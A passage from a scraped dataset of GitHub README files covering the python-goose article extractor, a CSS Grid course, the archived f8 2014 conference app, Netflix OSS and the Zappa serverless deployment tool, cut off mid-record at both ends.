http:\/\/i2.cdn.turner.com\/cnn\/dam\/assets\/111017024308-occupy-london-st-paul-s-cathedral-story-top.jpg\n\nConfiguration\n-------------\n\nThere are two ways to pass configuration to goose. The first one is to\npass goose a Configuration() object. The second one is to pass a\nconfiguration dict.\n\nFor instance, if you want to change the userAgent used by Goose just\npass:\n\n::\n\n    >>> g = Goose({'browser_user_agent': 'Mozilla'})\n\nSwitching parsers : Goose can now be used with lxml html parser or lxml\nsoup parser. By default the html parser is used. If you want to use the\nsoup parser pass it in the configuration dict :\n\n::\n\n    >>> g = Goose({'browser_user_agent': 'Mozilla', 'parser_class':'soup'})\n\nGoose is now language aware\n---------------------------\n\nFor example, scraping a Spanish content page with correct meta language\ntags:\n\n::\n\n    >>> from goose import Goose\n    >>> url = 'http:\/\/sociedad.elpais.com\/sociedad\/2012\/10\/27\/actualidad\/1351332873_157836.html'\n    >>> g = Goose()\n    >>> article = g.extract(url=url)\n    >>> article.title\n    u'Las listas de espera se agravan'\n    >>> article.cleaned_text[:150]\n    u'Los recortes pasan factura a los pacientes. De diciembre de 2010 a junio de 2012 las listas de espera para operarse aumentaron un 125%. Hay m\\xe1s ciudad'\n\nSome pages don't have correct meta language tags, you can force it using\nconfiguration :\n\n::\n\n    >>> from goose import Goose\n    >>> url = 'http:\/\/www.elmundo.es\/elmundo\/2012\/10\/28\/espana\/1351388909.html'\n    >>> g = Goose({'use_meta_language': False, 'target_language':'es'})\n    >>> article = g.extract(url=url)\n    >>> article.cleaned_text[:150]\n    u'Importante golpe a la banda terrorista ETA en Francia. La Guardia Civil ha detenido en un hotel de Macon, a 70 kil\\xf3metros de Lyon, a Izaskun Lesaka y '\n\nPassing {'use\\_meta\\_language': False, 'target\\_language':'es'} will\nforcibly select Spanish.\n\n\nVideo extraction\n----------------\n\n::\n\n    >>> import goose\n    >>> url = 'http:\/\/www.liberation.fr\/politiques\/2013\/08\/12\/journee-de-jeux-pour-ayrault-dans-les-jardins-de-matignon_924350'\n    >>> g = goose.Goose({'target_language':'fr'})\n    >>> article = g.extract(url=url)\n    >>> article.movies\n    [<goose.videos.videos.Video object at 0x25f60d0>]\n    >>> article.movies[0].src\n    'http:\/\/sa.kewego.com\/embed\/vp\/?language_code=fr&playerKey=1764a824c13c&configKey=dcc707ec373f&suffix=&sig=9bc77afb496s&autostart=false'\n    >>> article.movies[0].embed_code\n    '<iframe src=\"http:\/\/sa.kewego.com\/embed\/vp\/?language_code=fr&amp;playerKey=1764a824c13c&amp;configKey=dcc707ec373f&amp;suffix=&amp;sig=9bc77afb496s&amp;autostart=false\" frameborder=\"0\" scrolling=\"no\" width=\"476\" height=\"357\"\/>'\n    >>> article.movies[0].embed_type\n    'iframe'\n    >>> article.movies[0].width\n    '476'\n    >>> article.movies[0].height\n    '357'\n\n\nGoose in Chinese\n----------------\n\nSome users want to use Goose for Chinese content. Chinese word\nsegmentation is way more difficult to deal with than occidental\nlanguages. Chinese needs a dedicated StopWord analyser that need to be\npassed to the config object.\n\n::\n\n    >>> from goose import Goose\n    >>> from goose.text import StopWordsChinese\n    >>> url  = 'http:\/\/www.bbc.co.uk\/zhongwen\/simp\/chinese_news\/2012\/12\/121210_hongkong_politics.shtml'\n    >>> g = Goose({'stopwords_class': StopWordsChinese})\n    >>> article = g.extract(url=url)\n    >>> print article.cleaned_text[:150]\n    \u9999\u6e2f\u884c\u653f\u957f\u5b98\u6881\u632f\u82f1\u5728\u5404\u65b9\u538b\u529b\u4e0b\u5c31\u5176\u5927\u5b85\u7684\u8fdd\u7ae0\u5efa\u7b51\uff08\u50ed\u5efa\uff09\u95ee\u9898\u5230\u7acb\u6cd5\u4f1a\u63a5\u53d7\u8d28\u8be2\uff0c\u5e76\u5411\u9999\u6e2f\u6c11\u4f17\u9053\u6b49\u3002\n\n    \u6881\u632f\u82f1\u5728\u661f\u671f\u4e8c\uff0812\u670810\u65e5\uff09\u7684\u7b54\u95ee\u5927\u4f1a\u5f00\u59cb\u4e4b\u9645\u5728\u5176\u6f14\u8bf4\u4e2d\u9053\u6b49\uff0c\u4f46\u5f3a\u8c03\u4ed6\u5728\u8fdd\u7ae0\u5efa\u7b51\u95ee\u9898\u4e0a\u6ca1\u6709\u9690\u7792\u7684\u610f\u56fe\u548c\u52a8\u673a\u3002\n\n    \u4e00\u4e9b\u4eb2\u5317\u4eac\u9635\u8425\u8bae\u5458\u6b22\u8fce\u6881\u632f\u82f1\u9053\u6b49\uff0c\u4e14\u8ba4\u4e3a\u5e94\u80fd\u83b7\u5f97\u9999\u6e2f\u6c11\u4f17\u63a5\u53d7\uff0c\u4f46\u8fd9\u4e9b\u8bae\u5458\u4e5f\u8d28\u95ee\u6881\u632f\u82f1\u6709\n\nGoose in Arabic\n---------------\n\nIn order to use Goose in Arabic you have to use the StopWordsArabic\nclass.\n\n::\n\n    >>> from goose import Goose\n    >>> from goose.text import StopWordsArabic\n    >>> url = 'http:\/\/arabic.cnn.com\/2013\/middle_east\/8\/3\/syria.clashes\/index.html'\n    >>> g = Goose({'stopwords_class': StopWordsArabic})\n    >>> article = g.extract(url=url)\n    >>> print article.cleaned_text[:150]\n    \u062f\u0645\u0634\u0642\u060c \u0633\u0648\u0631\u064a\u0627 (CNN) -- \u0623\u0643\u062f\u062a \u062c\u0647\u0627\u062a \u0633\u0648\u0631\u064a\u0629 \u0645\u0639\u0627\u0631\u0636\u0629 \u0623\u0646 \u0641\u0635\u0627\u0626\u0644 \u0645\u0633\u0644\u062d\u0629 \u0645\u0639\u0627\u0631\u0636\u0629 \u0644\u0646\u0638\u0627\u0645 \u0627\u0644\u0631\u0626\u064a\u0633 \u0628\u0634\u0627\u0631 \u0627\u0644\u0623\u0633\u062f \u0648\u0639\u0644\u0649 \u0635\u0644\u0629 \u0628\u0640\"\u0627\u0644\u062c\u064a\u0634 \u0627\u0644\u062d\u0631\" \u062a\u0645\u0643\u0646\u062a \u0645\u0646 \u0627\u0644\u0633\u064a\u0637\u0631\u0629 \u0639\u0644\u0649 \u0645\u0633\u062a\u0648\u062f\u0639\u0627\u062a \u0644\u0644\u0623\u0633\u0644\n\n\nGoose in Korean\n----------------\n\nIn order to use Goose in Korean you have to use the StopWordsKorean\nclass.\n\n::\n\n    >>> from goose import Goose\n    >>> from goose.text import StopWordsKorean\n    >>> url='http:\/\/news.donga.com\/3\/all\/20131023\/58406128\/1'\n    >>> g = Goose({'stopwords_class':StopWordsKorean})\n    >>> article = g.extract(url=url)\n    >>> print article.cleaned_text[:150]\n    \uacbd\uae30\ub3c4 \uc6a9\uc778\uc5d0 \uc790\ub9ac \uc7a1\uc740 \ubbfc\uac04 \uc2dc\ud5d8\uc778\uc99d \uc804\ubb38\uae30\uc5c5 \u321c\ub514\uc9c0\ud138\uc774\uc5e0\uc528(www.digitalemc.com). \n    14\ub144\uc9f8 \uc138\uacc4 \uac01\uad6d\uc758 \ud1b5\uc2e0\u00b7\uc548\uc804\u00b7\uc804\ud30c \uaddc\uaca9 \uc2dc\ud5d8\uacfc \uc778\uc99d \ud55c \uc6b0\ubb3c\ub9cc \ud30c\uace0 \uc788\ub294 \uc774 \ud68c\uc0ac \ubc15\ucc44\uaddc \ub300\ud45c\uac00 \ub9cc\ub098\uae30\ub85c \ud55c \uc8fc\uc778\uacf5\uc774\ub2e4. \n    \uadf8\ub294 \uc804\uae30\uc804\uc790\u00b7\ubb34\uc120\ud1b5\uc2e0\u00b7\uc790\ub3d9\ucc28 \uc804\uc7a5\ud488 \ubd84\uc57c\uc5d0\n\n\nKnown issues\n------------\n\n- There are some issues with unicode URLs.\n- Cookie handling : Some websites need cookie handling. At the moment the only work around is to use the raw_html extraction. For instance:\n\n    >>> import urllib2\n    >>> import goose\n    >>> url = \"http:\/\/www.nytimes.com\/2013\/08\/18\/world\/middleeast\/pressure-by-us-failed-to-sway-egypts-leaders.html?hp\"\n    >>> opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())\n    >>> response = opener.open(url)\n    >>> raw_html = response.read()\n    >>> g = goose.Goose()\n    >>> a = g.extract(raw_html=raw_html)\n    >>> a.cleaned_text\n    u'CAIRO \\u2014 For a moment, at least, American and European diplomats trying to defuse the volatile standoff in Egypt thought they had a breakthrough.\\n\\nAs t'\n\nTODO\n----\n\n-  Video html5 tag extraction\n\n\n.. |Build Status| image:: https:\/\/travis-ci.org\/grangier\/python-goose.png?branch=develop   :target: https:\/\/travis-ci.org\/grangier\/python-goose\n"},{"repo":"\/wesbos\/css-grid","language":"HTML","readme_contents":"![](https:\/\/res.cloudinary.com\/wesbos\/image\/upload\/v1515524452\/GRID-social-share_wlfzk3.png)\n\n# CSS Grid Video Course\n\nHey! These are the starter files and finished solutions. Grab the full course over at [CSSGrid.io](https:\/\/CSSGrid.io).\n\n## Course FAQ\n\n### Q: I'm getting Browsersync Couldn't open browser (if you are using BrowserSync in a headless environment, you might want to set the open option to false)\n\nThis is because some versions of Firefox are \"FirefoxDeveloperEdition\" and some new downloads are \"Firefox Developer Edition\". If you had downloaded the browser before the course, just remove the spaces from the package.json command so it says \"FirefoxDeveloperEdition\"\n\n### Q: I can't see the lines \/ numbers of Firefox' CSS Grid Inspection Tools\n\nMake sure to turn off both \"Use recommended performance settings\" & \"Use hardware acceleration when available\u201c within Preferences > Performance\n\n## Community CSS Grid Content\n\nFeel free to submit a PR adding a link to your own recaps, guides or reviews!\n\n* [Course Review](https:\/\/www.bencodezen.io\/blog\/review-css-grid-with-wes-bos\/) by [@bencodezen](https:\/\/www.twitter.com\/bencodezen)\n* [Recap and lessons learned](https:\/\/marcokuehbauch.com\/blog\/2018\/learning-css-grid\/) by [@mkuehb](https:\/\/twitter.com\/Mkuehb)\n\n## A note on Pull Requests\n\nThese are meant to be 1:1 copies of what is done in the video. If you found a better \/ different way to do things, great, but I will be keeping them the same as the videos.\n\nThe starter files + solutions will be updated if\/when the videos are updated.\n\nThanks!\n\n## Live editable examples\n\nI recommend you use the files in the repo, but if you prefer to use JSFiddle instead, here are all the starter files ready to go:\n\n02. [Starter Files and Tooling Setup](https:\/\/jsfiddle.net\/6qvwur9q\/)\n03. [CSS Grid Fundamentals](https:\/\/jsfiddle.net\/qxxpgg4j\/)\n04. [CSS Grid Dev Tools](https:\/\/jsfiddle.net\/b55x8vh2\/)\n05. [CSS Grid Implicit vs Explicit Tracks](https:\/\/jsfiddle.net\/mon8xdgb\/)\n06. [CSS grid-auto-flow Explained](https:\/\/jsfiddle.net\/Loq4uj16\/)\n07. [Sizing tracks in CSS Grid](https:\/\/jsfiddle.net\/q8h3r8yb\/)\n08. [CSS Grid repeat function](https:\/\/jsfiddle.net\/8f8xyx86\/)\n09. [Sizing Grid Items](https:\/\/jsfiddle.net\/wqs6tcuk\/)\n10. [Placing Grid Items](https:\/\/jsfiddle.net\/hs5xhvpp\/)\n11. [Spanning and Placing Cardio](https:\/\/jsfiddle.net\/2z7z6o9k\/)\n12. [auto-fit and auto-fill](https:\/\/jsfiddle.net\/d1pLngzx\/)\n13. [Using minmax() for Responsive Grids](https:\/\/jsfiddle.net\/xthszm2j\/)\n14. Grid Template Areas:\n    - [Area Line Names](https:\/\/jsfiddle.net\/tkyxomht\/)\n    - [Areas](https:\/\/jsfiddle.net\/p0sn7L7v\/)\n15. [Naming Lines in CSS Grid](https:\/\/jsfiddle.net\/ygpmn0xh\/)\n16. [grid-auto-flow dense Block Fitting](https:\/\/jsfiddle.net\/sxj83p70\/)\n17. [CSS Grid Alignment + Centering](https:\/\/jsfiddle.net\/eyL9a2gv\/)\n18. [Re-ordering Grid Items](https:\/\/jsfiddle.net\/uscf9mk0\/)\n19. [Nesting Grid with Album Layouts](https:\/\/jsfiddle.net\/yn7jak0y\/)\n20. [CSS Grid Image Gallery](https:\/\/jsfiddle.net\/cbjzped2\/)\n21. Flexbox vs CSS Grid:\n    - [Axis Flipping](https:\/\/jsfiddle.net\/pt8hym9s\/)\n    - [Controls on Right](https:\/\/jsfiddle.net\/4o7gavuj\/)\n    - [Flex on Item](https:\/\/jsfiddle.net\/1u264ftd\/)\n    - [Perfectly Centered](https:\/\/jsfiddle.net\/sgbrtrjo\/)\n    - [Self Control](https:\/\/jsfiddle.net\/c6gg8pkn\/)\n    - [Stacked Layout](https:\/\/jsfiddle.net\/mnfm1sw0\/)\n    - [Unknown Content Size](https:\/\/jsfiddle.net\/4ze02bkj\/)\n    - [Unknown Number of Items](https:\/\/jsfiddle.net\/Lg7r3jmy\/)\n    - [Variable Widths on Each Row](https:\/\/jsfiddle.net\/qymhootd\/)\n22. [Recreating Codepen](https:\/\/jsfiddle.net\/br6n54qt\/)\n23. [Bootstrappy Grid with CSS Variables](https:\/\/jsfiddle.net\/gLLht2hd\/)\n24. [Responsive Website](https:\/\/jsfiddle.net\/bh16ofp8\/)\n25. [Full Bleed Blog Layout](https:\/\/jsfiddle.net\/j8w6v3mh\/)\n"},{"repo":"\/facebookarchive\/f8DeveloperConferenceApp","language":"HTML","readme_contents":"# [Archive] f8 app #\n\n**Note:** *This repository is not under active development.*\n\nThis is the entire source code of the official [f8 2014](http:\/\/www.fbf8.com) apps, available on the [App Store](https:\/\/itunes.apple.com\/us\/app\/f8\/id853467066?mt=8) as well as on [Google Play](https:\/\/play.google.com\/store\/apps\/details?id=com.parse.f8).\n\nRead more about these apps on our blog: [Open Sourcing the f8 Conference Apps](http:\/\/blog.parse.com\/2014\/08\/28\/open-sourcing-the-f8-conference-apps\/)\n\n## Initial Setup ##\n\nFirst, you need to clone the repository.\n\nNext, you'll need to create a new Parse app. For simplicity, we've included a JSON export of the f8 app which you can use for an initial import of data into your own app.\n\nYou'll also need to create a Facebook app and configure it for the platforms you wish to test on.\n\n### Parse App Setup ###\n\n1. Go to your [Parse Dashboard](https:\/\/parse.com\/apps) and create a new Parse app.\n2. Copy your new Parse application id and client key. You will need these later. Remember that you can always get your keys from your app's Settings page.\n3. Locate the `data` folder in your local clone of the repo. Here you will find `GeneralInfo.json`, `Message.json`, `Room.json`, `Slot.json`, `Speaker.json`, and `Talk.json` . These can be imported into your brand new Parse app.\n4. Go to your app's Data Browser, and click on the \"Import\" button. Choose `GeneralInfo.json` and give your new class the name \"GeneralInfo\". Repeat this for each of the json files in the `data` folder, giving them the appropriate class name.\n5. When the data is imported, images files are not brought over. We've provided images for the `Room` icons that you can use. To add these:\n    1. Locate the `assets` folder in your local repo.\n    2. Go to `Room` class in your Data Browser.\n    3. Delete the `gameslounge.png` entry in the `icon` field.\n    4. Upload the `gameslounge.png` file from the `assets` folder.\n    5. Repeat these steps for all other images you find in the `assets` folder.\n\n6. We've also provided images for the `Talk` class `icon` fields that are set. Replace these images in the `Talk` class with the corresponding ones in the `assets` folder: `afterparty.png`, `registration.png`, and `lunch.png`.\n\nOther images, such as speaker images will show up as blank. You can upload your own images to make them visible.\n\n### Facebook App Setup ###\n\n1. Go to the [Facebook App Dashboard](https:\/\/developers.facebook.com\/apps) and create a new Facebook app.\n2. Configure your Facebook app:\n\n    + [iOS Setup](https:\/\/developers.facebook.com\/docs\/ios\/getting-started#appid). During this step, you may initially set the `Bundle Identifier` to \"com.parse.f8\". If you later change the bundle identifier in your Xcode project, be sure to return to the app dashboard and modify this setting.\n    + [Android Setup](https:\/\/developers.facebook.com\/docs\/android\/getting-started#create-app). During this step, you may initially set `Package Name` to \"com.parse.f8\" and `Clas Name` to \"com.parse.f8.DispatchActivity\". If you later change the Android package name in the code, be sure to return to the app dashboard and modify these settings.\n\n3. Add your Facebook app id and app secret to your Parse app's `Settings > User authentication > Facebook` properties.\n4. Note your Facebook `App ID` and `Display Name`. You will need these later.\n\nNext, go through the setup instructions for iOS and\/or Android.\n\n## iOS Setup ##\n\nFirst, make sure you've gone through the \"Initial Setup\" instructions.\n\nThen, to install the f8 app on iOS you need to configure the project with your app keys:\n\n1. Open `ios\/F8 Developer Conference.xcodeproj` in Xcode.\n2. Modify `PDDAppDelegate.m` to use your Parse application id and client key.\n3. Modify `F8 Developer Conference-Info.plist` to configure your Facebook settings:\n    + Set your Facebook app id in the `FacebookAppID` property.\n    + Set your Facebook app id in the `URL types > Item 0 > URL Schemes > Item 0` using the format fbYour_App_id (ex. for 12345, enter fb12345).\n    + Set the `Bundle identifier` property to match your Facebook app dashboard's `Bundle ID` setting.\n    + Set the `FacebookDisplayName` property to match your Facebook app dashboard's `Display Name` setting.\n4. Build and Run.\n\nOnce you've confirmed that everything is working correctly, you may modify the general conference info and the list of Talks, Speakers, and Rooms to suit your conference.\n\n## Android Setup ##\n\nFirst, make sure you've gone through the \"Initial Setup\" instructions.\n\nThen to install the f8 app on Android, you need to import the f8 project and supporting library projects. You'll then configure the f8 project with your app keys. You also need to obtain a YouTube API key from Google if you wish to see video playback in action:\n\nyou need to configure the project with your app keys. The app depends on Android's [v7 appcompat Support Library](http:\/\/developer.android.com\/tools\/support-library\/features.html#v7) so you'll need to set that up. You also need to obtain a YouTube API key from Google if you wish to see video playback in action:\n\n1. Import the `android` f8 project in your IDE of choice, such as Eclipse.\n2. Import the `appcompat` Android Support library project from the local repo.\n3. Import the `facebook-android-sdk` Facebook SDK library project from the local repo.\n3. Follow the instructions on Google's developer site to [register your application and obtain a YouTube developer key](https:\/\/developers.google.com\/youtube\/android\/player\/register). Set up an API key for Android.\n4. Modify the f8 project's `strings.xml` file to use your Parse application id, Parse client key, Facebook app id, and YouTube developer key.\n5. Build and Run.\n\n## Further Customizations ##\n\nOnce you've confirmed that everything is working correctly, you may  modify the general conference info, the list of Talks, Speakers, and Rooms to suit your conference.\n"},{"repo":"\/Netflix\/netflix.github.com","language":"HTML","readme_contents":"Source for the Netflix OSS Hub : http:\/\/netflix.github.io\/\n"},{"repo":"\/Miserlou\/Zappa","language":"Python","readme_contents":"<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/oePnHJn.jpg\" alt=\"Zappa Rocks!\"\/>\n<\/p>\n\n## Zappa - Serverless Python\n\n[![Build Status](https:\/\/travis-ci.org\/Miserlou\/Zappa.svg)](https:\/\/travis-ci.org\/Miserlou\/Zappa)\n[![Coverage](https:\/\/img.shields.io\/coveralls\/Miserlou\/Zappa.svg)](https:\/\/coveralls.io\/github\/Miserlou\/Zappa)\n[![PyPI](https:\/\/img.shields.io\/pypi\/v\/Zappa.svg)](https:\/\/pypi.python.org\/pypi\/zappa)\n[![Slack](https:\/\/img.shields.io\/badge\/chat-slack-ff69b4.svg)](https:\/\/slack.zappa.io\/)\n[![Gun.io](https:\/\/img.shields.io\/badge\/made%20by-gun.io-blue.svg)](https:\/\/gun.io\/)\n[![Patreon](https:\/\/img.shields.io\/badge\/support-patreon-brightgreen.svg)](https:\/\/patreon.com\/zappa)\n\n<!-- START doctoc generated TOC please keep comment here to allow auto update -->\n<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->\n\n\n- [About](#about)\n- [Installation and Configuration](#installation-and-configuration)\n  - [Running the Initial Setup \/ Settings](#running-the-initial-setup--settings)\n- [Basic Usage](#basic-usage)\n  - [Initial Deployments](#initial-deployments)\n  - [Updates](#updates)\n  - [Rollback](#rollback)\n  - [Scheduling](#scheduling)\n    - [Advanced Scheduling](#advanced-scheduling)\n  - [Undeploy](#undeploy)\n  - [Package](#package)\n    - [How Zappa Makes Packages](#how-zappa-makes-packages)\n  - [Template](#template)\n  - [Status](#status)\n  - [Tailing Logs](#tailing-logs)\n  - [Remote Function Invocation](#remote-function-invocation)\n  - [Django Management Commands](#django-management-commands)\n  - [SSL Certification](#ssl-certification)\n    - [Deploying to a Domain With AWS Certificate Manager](#deploying-to-a-domain-with-aws-certificate-manager)\n    - [Deploying to a Domain With a Let's Encrypt Certificate (DNS Auth)](#deploying-to-a-domain-with-a-lets-encrypt-certificate-dns-auth)\n    - [Deploying to a Domain With a Let's Encrypt Certificate (HTTP Auth)](#deploying-to-a-domain-with-a-lets-encrypt-certificate-http-auth)\n    - [Deploying to a Domain With Your Own SSL Certs](#deploying-to-a-domain-with-your-own-ssl-certs)\n- [Executing in Response to AWS Events](#executing-in-response-to-aws-events)\n- [Asynchronous Task Execution](#asynchronous-task-execution)\n  - [Catching Exceptions](#catching-exceptions)\n  - [Task Sources](#task-sources)\n  - [Direct Invocation](#direct-invocation)\n  - [Remote Invocations](#remote-invocations)\n  - [Restrictions](#restrictions)\n  - [Running Tasks in a VPC](#running-tasks-in-a-vpc)\n  - [Responses](#responses)\n- [Advanced Settings](#advanced-settings)\n    - [YAML Settings](#yaml-settings)\n- [Advanced Usage](#advanced-usage)\n  - [Keeping The Server Warm](#keeping-the-server-warm)\n    - [Serving Static Files \/ Binary Uploads](#serving-static-files--binary-uploads)\n  - [Enabling CORS](#enabling-cors)\n  - [Large Projects](#large-projects)\n  - [Enabling Bash Completion](#enabling-bash-completion)\n  - [Enabling Secure Endpoints on API Gateway](#enabling-secure-endpoints-on-api-gateway)\n    - [API Key](#api-key)\n    - [IAM Policy](#iam-policy)\n    - [API Gateway Lambda Authorizers](#api-gateway-lambda-authorizers)\n    - [Cognito User Pool Authorizer](#cognito-user-pool-authorizer)\n    - [API Gateway Resource Policy](#api-gateway-resource-policy)\n  - [Setting Environment Variables](#setting-environment-variables)\n    - [Local Environment Variables](#local-environment-variables)\n    - [Remote AWS Environment Variables](#remote-aws-environment-variables)\n    - [Remote Environment Variables](#remote-environment-variables)\n    - [Remote Environment Variables (via an S3 file)](#remote-environment-variables-via-an-s3-file)\n  - [API Gateway Context Variables](#api-gateway-context-variables)\n  - [Catching Unhandled Exceptions](#catching-unhandled-exceptions)\n  - [Using Custom AWS IAM Roles and Policies](#using-custom-aws-iam-roles-and-policies)\n    - [Custom AWS IAM Roles and Policies for Deployment](#custom-aws-iam-roles-and-policies-for-deployment)\n    - [Custom AWS IAM Roles and Policies for Execution](#custom-aws-iam-roles-and-policies-for-execution)\n  - [AWS X-Ray](#aws-x-ray)\n  - [Globally Available Server-less Architectures](#globally-available-server-less-architectures)\n  - [Raising AWS Service Limits](#raising-aws-service-limits)\n  - [Using Zappa With Docker](#using-zappa-with-docker)\n  - [Dead Letter Queues](#dead-letter-queues)\n  - [Unique Package ID](#unique-package-id)\n  - [Application Load Balancer Event Source](#application-load-balancer-event-source)\n  - [Endpoint Configuration](#endpoint-configuration)\n    - [Example Private API Gateway configuration](#example-private-api-gateway-configuration)\n- [Zappa Guides](#zappa-guides)\n- [Zappa in the Press](#zappa-in-the-press)\n- [Sites Using Zappa](#sites-using-zappa)\n- [Related Projects](#related-projects)\n- [Hacks](#hacks)\n- [Contributing](#contributing)\n    - [Using a Local Repo](#using-a-local-repo)\n- [Patrons](#patrons)\n- [Merch](#merch)\n- [Support \/ Development \/ Training \/ Consulting](#support--development--training--consulting)\n\n<!-- END doctoc generated TOC please keep comment here to allow auto update -->\n\n## About\n\n<p align=\"center\">\n  <a href=\"https:\/\/htmlpreview.github.io\/?https:\/\/raw.githubusercontent.com\/Miserlou\/Talks\/master\/serverless-sf\/big.quickstart.html\"><img src=\"http:\/\/i.imgur.com\/c23kDNT.png?1\" alt=\"Zappa Slides\"\/><\/a>\n<\/p>\n<p align=\"center\">\n  <i>In a hurry? Click to see <a href=\"https:\/\/htmlpreview.github.io\/?https:\/\/raw.githubusercontent.com\/Miserlou\/Talks\/master\/serverless-sf\/big.quickstart.html\">(now slightly out-dated) slides from Serverless SF<\/a>!<\/i>\n<\/p>\n\n**Zappa** makes it super easy to build and deploy server-less, event-driven Python applications (including, but not limited to, WSGI web apps) on AWS Lambda + API Gateway. Think of it as \"serverless\" web hosting for your Python apps. That means **infinite scaling**, **zero downtime**, **zero maintenance** - and at a fraction of the cost of your current deployments!\n\nIf you've got a Python web app (including Django and Flask apps), it's as easy as:\n\n```\n$ pip install zappa\n$ zappa init\n$ zappa deploy\n```\n\nand now you're server-less! _Wow!_\n\n> What do you mean \"serverless\"?\n\nOkay, so there still is a server - but it only has a _40 millisecond_ life cycle! Serverless in this case means **\"without any permanent infrastructure.\"**\n\nWith a traditional HTTP server, the server is online 24\/7, processing requests one by one as they come in. If the queue of incoming requests grows too large, some requests will time out. With Zappa, **each request is given its own virtual HTTP \"server\"** by Amazon API Gateway. AWS handles the horizontal scaling automatically, so no requests ever time out. Each request then calls your application from a memory cache in AWS Lambda and returns the response via Python's WSGI interface. After your app returns, the \"server\" dies.\n\nBetter still, with Zappa you only pay for the milliseconds of server time that you use, so it's many **orders of magnitude cheaper** than VPS\/PaaS hosts like Linode or Heroku - and in most cases, it's completely free. Plus, there's no need to worry about load balancing or keeping servers online ever again.\n\nIt's great for deploying serverless microservices with frameworks like Flask and Bottle, and for hosting larger web apps and CMSes with Django. Or, you can use any WSGI-compatible app you like! You **probably don't need to change your existing applications** to use it, and you're not locked into using it.\n\nZappa also lets you build hybrid event-driven applications that can scale to **trillions of events** a year with **no additional effort** on your part! You also get **free SSL certificates**, **global app deployment**, **API access management**, **automatic security policy generation**, **precompiled C-extensions**, **auto keep-warms**, **oversized Lambda packages**, and **many other exclusive features**!\n\nAnd finally, Zappa is **super easy to use**. You can deploy your application with a single command out of the box!\n\n__Awesome!__\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/f1PJxCQ.gif\" alt=\"Zappa Demo Gif\"\/>\n<\/p>\n\n## Installation and Configuration\n\n_Before you begin, make sure you are running Python 2.7 or Python 3.6 and you have a valid AWS account and your [AWS credentials file](https:\/\/blogs.aws.amazon.com\/security\/post\/Tx3D6U6WSFGOK2H\/A-New-and-Standardized-Way-to-Manage-Credentials-in-the-AWS-SDKs) is properly installed._\n\n**Zappa** can easily be installed through pip, like so:\n\n    $ pip install zappa\n\nPlease note that Zappa _**must**_ be installed into your project's [virtual environment](http:\/\/docs.python-guide.org\/en\/latest\/dev\/virtualenvs\/). The virtual environment name should not be the same as the Zappa project name, as this may cause errors.\n\n_(If you use [pyenv](https:\/\/github.com\/yyuu\/pyenv) and love to manage virtualenvs with **pyenv-virtualenv**, you just have to call `pyenv local [your_venv_name]` and it's ready. [Conda](http:\/\/conda.pydata.org\/docs\/) users should comment [here](https:\/\/github.com\/Miserlou\/Zappa\/pull\/108).)_\n\nNext, you'll need to define your local and server-side settings.\n\n### Running the Initial Setup \/ Settings\n\n**Zappa** can automatically set up your deployment settings for you with the `init` command:\n\n    $ zappa init\n\nThis will automatically detect your application type (Flask\/Django - Pyramid users [see here](https:\/\/github.com\/Miserlou\/Zappa\/issues\/278#issuecomment-241917956)) and help you define your deployment configuration settings. Once you finish initialization, you'll have a file named *zappa_settings.json* in your project directory defining your basic deployment settings. It will probably look something like this for most WSGI apps:\n\n```javascript\n{\n    \/\/ The name of your stage\n    \"dev\": {\n        \/\/ The name of your S3 bucket\n        \"s3_bucket\": \"lambda\",\n\n        \/\/ The modular python path to your WSGI application function.\n        \/\/ In Flask and Bottle, this is your 'app' object.\n        \/\/ Flask (your_module.py):\n        \/\/ app = Flask()\n        \/\/ Bottle (your_module.py):\n        \/\/ app = bottle.default_app()\n        \"app_function\": \"your_module.app\"\n    }\n}\n```\n\nor for Django:\n\n```javascript\n{\n    \"dev\": { \/\/ The name of your stage\n       \"s3_bucket\": \"lambda\", \/\/ The name of your S3 bucket\n       \"django_settings\": \"your_project.settings\" \/\/ The python path to your Django settings.\n    }\n}\n```\n\n_Psst: If you're deploying a Django application with Zappa for the first time, you might want to read Edgar Roman's [Django Zappa Guide](https:\/\/edgarroman.github.io\/zappa-django-guide\/)._\n\nYou can define as many stages as your like - we recommend having _dev_, _staging_, and _production_.\n\nNow, you're ready to deploy!\n\n## Basic Usage\n\n### Initial Deployments\n\nOnce your settings are configured, you can package and deploy your application to a stage called \"production\" with a single command:\n\n    $ zappa deploy production\n    Deploying..\n    Your application is now live at: https:\/\/7k6anj0k99.execute-api.us-east-1.amazonaws.com\/production\n\nAnd now your app is **live!** How cool is that?!\n\nTo explain what's going on, when you call `deploy`, Zappa will automatically package up your application and local virtual environment into a Lambda-compatible archive, replace any dependencies with versions [precompiled for Lambda](https:\/\/github.com\/Miserlou\/lambda-packages), set up the function handler and necessary WSGI Middleware, upload the archive to S3, create and manage the necessary Amazon IAM policies and roles, register it as a new Lambda function, create a new API Gateway resource, create WSGI-compatible routes for it, link it to the new Lambda function, and finally delete the archive from your S3 bucket. Handy!\n\nBe aware that the default IAM role and policy created for executing Lambda applies a liberal set of permissions.\nThese are most likely not appropriate for production deployment of important applications.  See the section\n[Custom AWS IAM Roles and Policies for Execution](#custom-aws-iam-roles-and-policies-for-execution) for more detail.\n\n### Updates\n\nIf your application has already been deployed and you only need to upload new Python code, but not touch the underlying routes, you can simply:\n\n    $ zappa update production\n    Updating..\n    Your application is now live at: https:\/\/7k6anj0k99.execute-api.us-east-1.amazonaws.com\/production\n\nThis creates a new archive, uploads it to S3 and updates the Lambda function to use the new code, but doesn't touch the API Gateway routes.\n\n### Rollback\n\nYou can also `rollback` the deployed code to a previous version by supplying the number of revisions to return to. For instance, to rollback to the version deployed 3 versions ago:\n\n    $ zappa rollback production -n 3\n\n### Scheduling\n\nZappa can be used to easily schedule functions to occur on regular intervals. This provides a much nicer, maintenance-free alternative to Celery!\nThese functions will be packaged and deployed along with your `app_function` and called from the handler automatically.\nJust list your functions and the expression to schedule them using [cron or rate syntax](http:\/\/docs.aws.amazon.com\/lambda\/latest\/dg\/tutorial-scheduled-events-schedule-expressions.html) in your *zappa_settings.json* file:\n\n```javascript\n{\n    \"production\": {\n       ...\n       \"events\": [{\n           \"function\": \"your_module.your_function\", \/\/ The function to execute\n           \"expression\": \"rate(1 minute)\" \/\/ When to execute it (in cron or rate format)\n       }],\n       ...\n    }\n}\n```\n\nAnd then:\n\n    $ zappa schedule production\n\nAnd now your function will execute every minute!\n\nIf you want to cancel these, you can simply use the 